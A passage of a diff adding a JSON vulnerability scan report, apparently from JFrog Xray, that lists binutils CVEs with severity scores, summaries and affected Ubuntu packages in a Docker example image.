+            "cve": "CVE-2022-27943",
+            "cvss_v2_score": "4.3",
+            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "libiberty/rust-demangle.c in GNU GCC 11.2 allows stack consumption in demangle_const, as demonstrated by nm-new.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-413268",
+        "references": [
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/H424YXGW7OKXS2NCAP35OP6Y4P4AW6VG/",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=28995",
+          "https://ubuntu.com/security/CVE-2022-27943",
+          "https://gcc.gnu.org/bugzilla/show_bug.cgi?id=105039"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-44840",
+            "cvss_v3_score": "7.8",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "summary": "Heap buffer overflow vulnerability in binutils readelf before 2.40 via function find_section_in_set in file readelf.c.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-529392",
+        "references": [
+          "https://ubuntu.com/security/CVE-2022-44840",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29732"
+        ],
+        "extended_information": {
+          "short_description": "Buffer overread in binutils leads to denial of service when reading debug information from a crafted ELF.",
+          "full_description": "The GNU [Binutils](https://www.gnu.org/software/binutils/) are a collection of binary tools. The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.\nIt was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable\nFor example - this can cause the `readelf` utility to crash when reading a crafted executable -\n`readelf -w ./PoC`\n\nNote that this issue cannot causes a 1-byte out-of-bounds write (overwriting a NULL terminator) which leads to an out-of-bounds read. Therefore - exploitation cannot lead to code execution in any case.\nThis leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.",
+          "jfrog_research_severity": "Medium",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
+              "description": "NVD wrongly classifies this issue as a buffer overflow, when in fact this issue is an out-of-bounds read and therefore cannot lead to code execution in any case.",
+              "is_positive": true
+            },
+            {
+              "name": "The issue has an exploit published",
+              "description": "A public PoC demonstrates DoS when running `readelf` on a crafted ELF"
+            },
+            {
+              "name": "The issue cannot result in a severe impact (such as remote code execution)",
+              "description": "Crashing a forked client process (ex. objdump or any other executable from binutils) has a negligible security impact. In addition, a 1-byte overread is unlikely to cause a real-world crash or meaningful data leak.",
+              "is_positive": true
+            }
+          ]
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2019-1010204",
+            "cvss_v2_score": "4.3",
+            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "GNU binutils gold gold v1.11-v1.16 (GNU binutils v2.21-v2.31.1) is affected by: Improper Input Validation, Signed/Unsigned Comparison, Out-of-bounds Read. The impact is: Denial of service. The component is: gold/fileread.cc:497, elfcpp/elfcpp_file.h:644. The attack vector is: An ELF file with an invalid e_shoff header field must be opened.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-95768",
+        "references": [
+          "https://support.f5.com/csp/article/K05032915?utm_source=f5support\u0026amp;utm_medium=RSS",
+          "https://security.netapp.com/advisory/ntap-20190822-0001/",
+          "https://ubuntu.com/security/CVE-2019-1010204",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=23765"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-4285",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "An illegal memory access flaw was found in the binutils package. Parsing an ELF file containing corrupt symbol version information may result in a denial of service. This issue is the result of an incomplete fix for CVE-2020-16599.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-425656",
+        "references": [
+          "https://bugzilla.redhat.com/show_bug.cgi?id=2150768",
+          "https://ubuntu.com/security/CVE-2022-4285",
+          "https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=5c831a3c7f3ca98d6aba1200353311e1a1f84c70",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29699"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-47010",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "An issue was discovered function pr_function_type in prdbg.c in Binutils 2.34 thru 2.38, allows attackers to cause a denial of service due to memory leaks.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532422",
+        "references": [
+          "https://ubuntu.com/security/CVE-2022-47010",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29262"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2017-13716",
+            "cvss_v2_score": "7.1",
+            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:C",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "The C++ symbol demangler routine in cplus-dem.c in libiberty, as distributed in GNU Binutils 2.29, allows remote attackers to cause a denial of service (excessive memory allocation and application crash) via a crafted file, as demonstrated by a call from the Binary File Descriptor (BFD) library (aka libbfd).",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
